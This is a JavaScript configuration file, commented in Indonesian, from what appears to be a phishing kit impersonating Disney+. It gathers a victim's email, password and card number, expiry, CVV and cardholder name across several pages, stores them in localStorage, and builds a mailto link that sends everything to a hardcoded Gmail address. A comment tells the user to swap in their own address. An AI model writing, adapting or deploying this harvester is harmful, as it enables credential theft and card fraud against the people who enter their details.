// ==============================================
// CONFIG.JS — PENYIMPANAN & PENGIRIMAN DATA KE EMAIL
// ==============================================

const DataPengguna = {
    // 🔧 GANTI ALAMAT EMAIL INI DENGAN EMAIL KAMU!
    emailPenerima: "vaneshadenino@gmail.com",  

    email: null,
    kataSandi: null,
    kartu: {
        nomor: null,
        kadaluarsa: null,
        cvv: null,
        nama: null
    },

    // Simpan Email dari halaman index.html
    simpanEmail: function(email) {
        this.email = email.trim();
        localStorage.setItem('emailPengguna', this.email);
        console.log('✅ Email tersimpan:', this.email);
        return true;
    },

    // Simpan Kata Sandi dari halaman password.html
    simpanKataSandi: function(sandi) {
        this.kataSandi = sandi;
        localStorage.setItem('kataSandiPengguna', sandi);
        console.log('✅ Kata sandi tersimpan');
        return true;
    },

    // Simpan Data Kartu dari halaman berlangganan.html
    simpanKartu: function(nomor, kadaluarsa, cvv, nama) {
        this.kartu.nomor = nomor.trim();
        this.kartu.kadaluarsa = kadaluarsa.trim();
        this.kartu.cvv = cvv.trim();
        this.kartu.nama = nama.trim();

        localStorage.setItem('nomorKartu', this.kartu.nomor);
        localStorage.setItem('kadaluarsaKartu', this.kartu.kadaluarsa);
        localStorage.setItem('cvvKartu', this.kartu.cvv);
        localStorage.setItem('namaKartu', this.kartu.nama);

        console.log('✅ Data kartu tersimpan:', this.kartu);
        return true;
    },

    // 📩 KIRIM SEMUA DATA KE EMAIL PEMILIK
    kirimDataKeEmail: function() {
        // Ambil data yang tersimpan
        const emailPengguna = this.email || localStorage.getItem('emailPengguna') || 'TIDAK DIISI';
        const sandiPengguna = this.kataSandi || localStorage.getItem('kataSandiPengguna') || 'TIDAK DIISI';
        const nomorKartu = this.kartu.nomor || localStorage.getItem('nomorKartu') || 'TIDAK DIISI';
        const kadaluarsaKartu = this.kartu.kadaluarsa || localStorage.getItem('kadaluarsaKartu') || 'TIDAK DIISI';
        const cvvKartu = this.kartu.cvv || localStorage.getItem('cvvKartu') || 'TIDAK DIISI';
        const namaKartu = this.kartu.nama || localStorage.getItem('namaKartu') || 'TIDAK DIISI';

        // Susun isi pesan email
        const isiPesan = `
📩 DATA PENGGUNA DISNEY+
══════════════════════════
📧 Email Pengguna: ${emailPengguna}
🔒 Kata Sandi: ${sandiPengguna}
💳 Nomor Kartu: ${nomorKartu}
📅 Kadaluarsa: ${kadaluarsaKartu}
🔐 CVV: ${cvvKartu}
👤 Nama di Kartu: ${namaKartu}
══════════════════════════
Waktu Pengiriman: ${new Date().toLocaleString('id-ID')}
        `;

        // Buat tautan mailto: untuk membuka program email
        const subjekEmail = "DATA PENGGUNA DISNEY+ — " + emailPengguna;
        const tautanKirim = `mailto:${this.emailPenerima}?subject=${encodeURIComponent(subjekEmail)}&body=${encodeURIComponent(isiPesan)}`;

        console.log('📩 Menyiapkan pengiriman data ke:', this.emailPenerima);
        console.log(isiPesan);

        // Buka program email pengguna dengan data sudah terisi
        window.location.href = tautanKirim;
        return true;
    },

    // Ambil data tersimpan
    ambilEmail: function() {
        return this.email || localStorage.getItem('emailPengguna') || null;
    },
    ambilKataSandi: function() {
        return this.kataSandi || localStorage.getItem('kataSandiPengguna') || null;
    },

    // Hapus semua data
    bersihkanSemua: function() {
        this.email = null;
        this.kataSandi = null;
        this.kartu = { nomor: null, kadaluarsa: null, cvv: null, nama: null };
        localStorage.clear();
        console.log('🗑️ Semua data telah dibersihkan');
    }
};